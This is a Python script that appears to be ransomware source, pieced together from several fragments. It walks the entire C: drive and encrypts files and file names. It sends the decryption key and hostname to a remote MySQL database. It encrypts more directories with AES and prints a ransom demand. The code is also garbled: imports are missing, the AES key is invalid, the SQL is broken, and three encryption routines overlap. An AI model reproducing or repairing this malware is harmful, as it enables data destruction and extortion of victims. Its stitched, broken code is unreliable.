import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from rich.console import Console
from src.gen import *
from src.install_builder import *
import logging
from src.Functions import *
from rich.logging import RichHandler
import subprocess

encryption_key = b'12345678'

target_directories = ['/path/to/directory1', '/path/to/directory2']
target_extensions = ['.txt', '.docx']

files = []

for file in os.listdir():

    if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
        continue

    if os.path.isfile(file):
        files.append(file)

print(files)

# Creating encryption key
key = Fernet.generate_key()
f = Fernet(key)

# Database connection
conn = mysql.connector.connect(
    host = "*****",
    user = "*****",
    password = "*****",
    database = "*****",
)
c = conn.cursor()

# Sending key and id to database
c.execute(f"INSERT INTO decryption_keys (keys) VALUES ({key} + ' ' + {gethostname()})")
conn.commit()

# Get base file name
name = path.basename(__file__)

# Extensions to encrypt
extensions = get_extensions()

# Scanning entire C drive
for root, dirs, files in walk("C:\\"):
    # Grabbing files
    for file in files:
        fpath  = root + "\\" + file
        ext = path.splitext(root + "\\" + file)[1]

        # Encrypting only files with specific extension
        if ext in extensions:
            # Checking the file is accessible
            try:
                # Encrypting content
                with open(fpath, "rb") as of:
                    original: bytes = of.read()

                encrypted = f.encrypt(original)

                with open(fpath, "wb") as of:
                    of.write(encrypted)

                # Encrypting filename
                filename = f.encrypt(file.encode())
                newpath: str = root + "\\" + filename.decode()
                rename(fpath, newpath)
            except:
                pass

key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

def encrypt_file(file_path):
    # Read the file
    with open(file_path, 'rb') as file:
        file_data = file.read()

    iv = os.urandom(16)

    cipher = Cipher(algorithms.AES(encryption_key), modes.CTR(iv), backend=default_backend())

    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(file_data) + encryptor.finalize()

    encrypted_data_with_iv = iv + encrypted_data

    with open(file_path, 'wb') as file:
        file.write(encrypted_data_with_iv)

def encrypt_files_in_directory(directory):
    for root, dirs, files in os.walk(directory):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            if os.path.splitext(file_path)[1] in target_extensions:
                encrypt_file(file_path)

for directory in target_directories:
    encrypt_files_in_directory(directory)

print('Your files have been encrypted. To decrypt them, send a payment to the following address...')
